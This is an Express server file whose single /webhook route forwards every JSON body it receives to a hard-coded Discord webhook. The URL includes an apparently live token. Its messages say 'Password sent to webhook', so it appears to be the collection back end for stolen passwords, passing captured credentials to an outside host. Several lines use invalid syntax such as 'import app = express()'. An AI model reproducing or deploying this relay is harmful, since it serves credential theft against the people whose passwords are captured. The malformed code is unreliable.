import express = require('express');
import fetch from 'node-fetch'; // For Node.js 18.x and newer (ES Modules)
import cors = require('cors');
import bodyParser = require('body-parser');

import app = express();

// Enable CORS
app.use(cors());

// Parse JSON bodies
app.use(bodyParser.json());

// This is the route that will handle the POST request to /webhook
app.post('/webhook', (req, res) => {
    import webhookData = req.body;
    import webhookUrl = 'https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq';  // Replace this with your actual Discord webhook URL

    // Send the data to the Discord webhook URL
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(webhookData),
    })
    .then((response) => {
        if (response.ok) {
            console.log('Password sent to webhook!');
            res.status(200).send('Password sent to webhook');
        } else {
            console.error('Failed to send password to webhook:', response.statusText);
            res.status(500).send('Failed to send password to webhook');
        }
    })
    .catch((error) => {
        console.error('Error sending password to webhook:', error);
        res.status(500).send('Error sending password to webhook');
    });
});

// Start server
app.listen(3000, () => {
    console.log('Server running on port 3000');
});
